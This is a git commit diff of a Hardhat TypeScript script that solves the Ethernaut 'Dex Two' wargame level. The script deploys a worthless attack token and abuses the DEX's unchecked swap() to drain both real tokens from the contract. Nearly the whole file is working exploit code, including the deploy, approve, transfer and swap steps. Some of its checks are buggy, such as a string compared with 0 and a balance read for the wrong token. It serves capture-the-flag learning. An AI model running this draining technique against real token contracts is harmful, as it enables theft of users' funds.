b0f1f738152ac90c8e4affd37aaae7768d294657
Crys <mariano.christopher123@gmail.com>
2023-01-03 19:27:51 +0800

    optimize dex two level

--- scripts/attackDexTwo.ts
+++ scripts/attackDexTwo.ts
@@ -3,9 +3,10 @@ import { ethers } from "hardhat";
 const attackDexTwo = async () => {
     // change contract addresses here.
     const dexTwoAddress = "0xAc7EcD98B60C2094BdD63eEaF73436ebE8A28e9a"; //type "await contract.address()" in ethernaut console
-    const attackTokenAddress = "0x54FCCBfD05d7842262A5f8ecCD0e10876Cd45E87"; // from your deployed contract
-    const token1Address = "0xc2A0E684884730Ad6483F83181b8343fF590C73A"; //type "await contract.token1()" in ethernaut console
-    const token2Address = "0x84E81ee2A1e6059Ca392D908d9000b79cDDB2afE"; //type "await contract.token2()" in ethernaut console
+    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
+    const args: any[] = [];
+    const deployer = process.env.PRIVATE_KEY || "";
+    // [deployer] = await ethers.getSigners();
 
     // Don't touch below
     // The vulnerability here arises from swap method which does not
@@ -18,15 +19,40 @@ const attackDexTwo = async () => {
     // token1 - token2 - ATK | token1 - token2 - ATK
     // ---------------------------------------------
     //   100     100     100 |   10      10      300
-    // TODO: automate token address getting from contract
-    // TODO: fix conclusion logs
 
-    const contractAttack = await ethers.getContract("AttackToken");
-    const approveATK = await contractAttack.approve(dexTwoAddress, 200);
+    // deploying attack contract here
+    // const deployed = await deployContract(hre, "AttackToken", args);
+    // alternative below
+    console.log("Deploying attack contract AttackToken...");
+    const Factory = await ethers.getContractFactory("AttackToken", deployer);
+    const attackToken = await Factory.deploy();
+    console.log(attackToken);
+    console.log(`Contract deployed to ${attackToken.address}`);
+    console.log("Attack contract deployed...");
+    // experimantal verify below
+    // if (attackToken.address){
+    //     console.log("Verifying contract...");
+    //     try {
+    //         await run("verify:verify", {
+    //             address: attackToken.address,
+    //             constructorArguments: args,
+    //         });
+    //     } catch (e: any) {
+    //         if (e.message.toLowerCase().includes("already verified")) {
+    //             console.log("Already verified!");
+    //         } else {
+    //             console.log(e);
+    //         }
+    //     }
+    // }
+
+    console.log("Approving ATK tokens for transfer...");
+    const attack = await ethers.getContractAt("AttackToken", attackToken.address);
+    const approveATK = await attack.approve(dexTwoAddress, 200);
     const approveATKtxn = await approveATK.wait();
     console.log(approveATKtxn);
     console.log("ATK token approved...Transfering next...");
-    const send1 = await contractAttack.transfer(dexTwoAddress, 100);
+    const send1 = await attack.transfer(dexTwoAddress, 100);
     const send1txn = await send1.wait();
     console.log(send1txn);
     console.log("ATK token sent to dexTwo...");
@@ -34,15 +60,40 @@ const attackDexTwo = async () => {
     const ABI = [
         "function approve(address spender, uint amount)",
         "function swap(address from, address to, uint amount)",
-        "function balanceOf(address token, address account)",
+        "function balanceOf(address token, address account) public view returns (uint)",
+        {
+            inputs: [],
+            name: "token1",
+            outputs: [{ internalType: "address", name: "", type: "address" }],
+            stateMutability: "view",
+            type: "function",
+        },
+        {
+            inputs: [],
+            name: "token2",
+            outputs: [{ internalType: "address", name: "", type: "address" }],
+            stateMutability: "view",
+            type: "function",
+        },
     ];
-    const contractDexTwo = await ethers.getContractAt(ABI, dexTwoAddress);
-    const approve = await contractAttack.approve(dexTwoAddress, 300);
+    const contract = await ethers.getContractAt(ABI, dexTwoAddress);
+    const token1Address = await contract.token1();
+    const token2Address = await contract.token2();
+    console.log(`Token 1 address is: ${token1Address}`);
+    console.log(`Token 2 address is: ${token2Address}`);
+    console.log("Checking token 1 and 2 balances...");
+    let token1Balance = await contract.balanceOf(token1Address, player);
+    let token2Balance = await contract.balanceOf(token2Address, player);
+    let token3Balance = await contract.balanceOf(token2Address, player);
+    console.log(`Token 1 balance is: ${token1Balance}`);
+    console.log(`Token 2 balance is: ${token2Balance}`);
+    console.log(`Token 3 balance is: ${token3Balance}`);
+    const approve = await attack.approve(dexTwoAddress, 300);
     const approveReceipt = await approve.wait();
     console.log(approveReceipt);
     console.log("Approved token transfers");
     console.log("Draining token1...");
-    const swap1 = await contractDexTwo.swap(attackTokenAddress, token1Address, 100);
+    const swap1 = await contract.swap(attackToken.address, token1Address, 100);
     const swap1txn = await swap1.wait();
     console.log(swap1txn);
     // sample table below of balances from here
@@ -52,7 +103,7 @@ const attackDexTwo = async () => {
     //   100     100     100 |   10      10      300
     // //   0       100     200 |   110     10      200
     console.log("Draining token2...");
-    const swap2 = await contractDexTwo.swap(attackTokenAddress, token2Address, 200);
+    const swap2 = await contract.swap(attackToken.address, token2Address, 200);
     const swap2txn = await swap2.wait();
     console.log(swap2txn);
     // final sample table below
@@ -63,7 +114,7 @@ const attackDexTwo = async () => {
     //   0       100     200 |   110     10      200
     //   0       0       400 |   110     110     0
     console.log("Checking balances of token1 and token2...");
-    const token1Balance = await contractDexTwo
+    token1Balance = await contract
         .balanceOf(token1Address, dexTwoAddress)
         .then((v: any) => v.toString());
     if (token1Balance === 0) {
@@ -72,7 +123,7 @@ const attackDexTwo = async () => {
         console.log("Token1 balance is not 0, continuing");
     }
 
-    const token2Balance = (await contractDexTwo.balanceOf(token2Address, dexTwoAddress)).toString();
+    token2Balance = (await contract.balanceOf(token2Address, dexTwoAddress)).toString();
     if (token2Balance === 0) {
         console.log("Token2 balance is 0, level passed and you can submit to ethernaut");
     } else {
